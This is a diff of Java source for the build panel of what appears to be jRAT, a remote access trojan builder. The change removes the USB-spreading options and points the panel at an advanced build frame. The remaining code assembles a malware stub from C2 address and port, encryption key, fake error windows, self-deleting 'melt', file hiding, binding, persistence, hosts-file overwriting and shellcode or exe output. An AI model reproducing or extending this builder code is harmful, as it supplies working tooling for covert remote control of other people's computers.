@@ -36,14 +36,13 @@ import pro.jrat.extensions.StubPlugin;
 import pro.jrat.io.Files;
 import pro.jrat.listeners.AdvancedBuildListener;
 import pro.jrat.settings.Settings;
-import pro.jrat.ui.frames.FrameBuild;
+import pro.jrat.ui.frames.FrameBuildAdvanced;
 import pro.jrat.ui.renderers.table.BuildTableRenderer;
-
 
 @SuppressWarnings("serial")
 public class PanelBuildFinal extends JPanel {
 
-	public FrameBuild holder;
+	public FrameBuildAdvanced holder;
 	private JTextField txtOutput;
 	private JLabel lblExpectedSizeUnknown;
 	private JProgressBar progressBar;
@@ -52,9 +51,9 @@ public class PanelBuildFinal extends JPanel {
 	private JButton btnBuild;
 	private LinkedHashMap<String, BuildStatus> statuses = new LinkedHashMap<String, BuildStatus>();
 	private JTable table;
-	
+
 	public DefaultTableModel getModel() {
-		return (DefaultTableModel)table.getModel();
+		return (DefaultTableModel) table.getModel();
 	}
 
 	public LinkedHashMap<String, BuildStatus> getStatuses() {
@@ -88,7 +87,7 @@ public class PanelBuildFinal extends JPanel {
 		}
 	}
 
-	public PanelBuildFinal(FrameBuild frame) {
+	public PanelBuildFinal(FrameBuildAdvanced frame) {
 
 		holder = frame;
 		this.frame = this;
@@ -176,7 +175,6 @@ public class PanelBuildFinal extends JPanel {
 					PanelBuildVisibility vis = (PanelBuildVisibility) holder.panels.get("tray icon");
 					PanelBuildError err = (PanelBuildError) holder.panels.get("error handling");
 					PanelBuildPersistance per = (PanelBuildPersistance) holder.panels.get("persistance");
-					PanelBuildUSB pusb = (PanelBuildUSB) holder.panels.get("usb");
 					PanelBuildDebugMessages pdebug = (PanelBuildDebugMessages) holder.panels.get("debug messages");
 					PanelBuildOutput out = (PanelBuildOutput) holder.panels.get("output");
 
@@ -218,9 +216,6 @@ public class PanelBuildFinal extends JPanel {
 					boolean handleerr = err.errorLogging();
 					boolean persistance = per.isPersistanceEnabled();
 					int persistancems = per.getMS();
-					boolean usb = pusb.copyToUsb();
-					String usbexclude = pusb.getExclude();
-					String usbname = pusb.getNameOfFile();
 					boolean debugmsg = pdebug.keepDebugMessages();
 					OSConfig osconfig = os.getConfig();
 
@@ -234,7 +229,7 @@ public class PanelBuildFinal extends JPanel {
 
 					if (out.useShellcode()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, usb, usbexclude, usbname, debugmsg, osconfig, true);
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 
 						if (!file.endsWith(".jar")) {
 							file = file + ".jar";
@@ -245,13 +240,13 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useExe()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, usb, usbexclude, usbname, debugmsg, osconfig, true);
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 
 						BuildExecutable.build(temp.getAbsolutePath(), file, out.frame);
 
 						temp.delete();
 					} else {
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, usb, usbexclude, usbname, debugmsg, osconfig, true);
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 					}
 
 					Settings.getGlobal().setVal("brecat", reconSec);
